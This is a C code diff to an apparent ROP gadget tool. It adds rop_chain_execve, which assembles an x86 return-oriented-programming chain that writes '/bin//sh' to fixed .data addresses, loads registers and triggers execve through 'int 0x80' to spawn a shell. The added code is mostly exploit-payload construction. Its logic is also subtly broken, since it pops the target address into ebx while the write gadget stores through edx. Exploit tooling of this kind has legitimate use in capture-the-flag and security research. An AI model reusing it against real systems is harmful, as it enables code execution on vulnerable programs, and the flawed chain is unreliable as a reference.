@@ -9,12 +9,15 @@ int rop_chain(unsigned char *binary, unsigned long binary_len)
         fprintf(stderr ,"malloc failed.\n");
         return -1;
     }
+    struct Gadget *head;
+    head = (struct Gadget *)malloc(sizeof(struct Gadget));
+    if(!head)
+    {
+        fprintf(stderr ,"malloc failed.\n");
+        return -1;
+    }
     rop_parse_gadgets(root, binary, binary_len);
-    rop_search_gadgets(root, "pop eax;ret");
-    rop_search_gadgets(root, "pop ebx;ret");
-    rop_search_gadgets(root, "pop ecx;ret");
-    rop_search_gadgets(root, "pop edx;ret");
-    rop_search_gadgets(root, "int 0x80");
+    rop_chain_execve(root, head);
     tree_free(root);
     return 0;
 }
@@ -82,7 +85,52 @@ int rop_parse_gadgets(struct Node *root, unsigned char *binary, unsigned long bi
     return 0;
 }
 
-unsigned int rop_search_gadgets(struct Node *root, char *gadget_string)
+int rop_chain_execve(struct Node *root, struct Gadget *head)
+{
+    unsigned int result = 1;
+    size_t i = 0;
+    rop_chain_list_init(head);
+    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
+    rop_chain_list_add(head, 0x080ef060, "@. data");
+    result *= rop_search_gadgets(root, head, "pop eax;ret", 1);
+    rop_chain_list_add(head, 0x6e69622f, "/bin");
+    result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);
+
+    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
+    rop_chain_list_add(head, 0x080ef064, "@. data + 4");
+    result *= rop_search_gadgets(root, head, "pop eax;ret", 1);
+    rop_chain_list_add(head, 0x68732f2f, "//sh");
+    result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);
+    
+    result *= rop_search_gadgets(root, head, "pop edx;ret", 1);
+    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
+    result *= rop_search_gadgets(root, head, "xor eax, eax;ret", 1);
+    result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);
+
+    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
+    rop_chain_list_add(head, 0x080ef060, "@. data");
+    result *= rop_search_gadgets(root, head, "pop ecx;ret", 1);
+    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
+    result *= rop_search_gadgets(root, head, "pop edx;ret", 1);
+    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
+
+    result *= rop_search_gadgets(root, head, "xor eax, eax;ret", 1);
+    for(i = 0; i < 11; i++)
+        result *= rop_search_gadgets(root, head, "inc eax;ret", 1);
+    result *= rop_search_gadgets(root, head, "int 0x80", 1);
+    if(!result)
+    {
+        printf("chain execve failed\n");
+    }
+    else
+    {
+        rop_chain_list_traverse(head);
+    }
+    rop_chain_list_free(head);
+    return 0;
+}
+
+unsigned int rop_search_gadgets(struct Node *root, struct Gadget *head, char *gadget_string, int add_list)
 {
     char *token;
     char copy_string[MaxGadgetLen];
@@ -98,7 +146,14 @@ unsigned int rop_search_gadgets(struct Node *root, char *gadget_string)
         }
         token = strtok(NULL, ";");
     }
-    printf("0x0%x %s\n", root->address, gadget_string);
+    if(add_list)
+    {
+        rop_chain_list_add(head, root->address, gadget_string);
+    }
+    else
+    {
+        printf("0x0%x: %s\n", root->address, gadget_string);
+    }
     return root->address;
 }
 
@@ -145,7 +200,7 @@ void rop_chain_list_traverse(struct Gadget *head)
     struct Gadget *temp;
     for(temp = head->next; temp; temp = temp->next)
     {
-        printf("0x0%x: %s\n", temp->address, temp->string);
+        printf("0x%08x: %s\n", temp->address, temp->string);
     }
 
 }
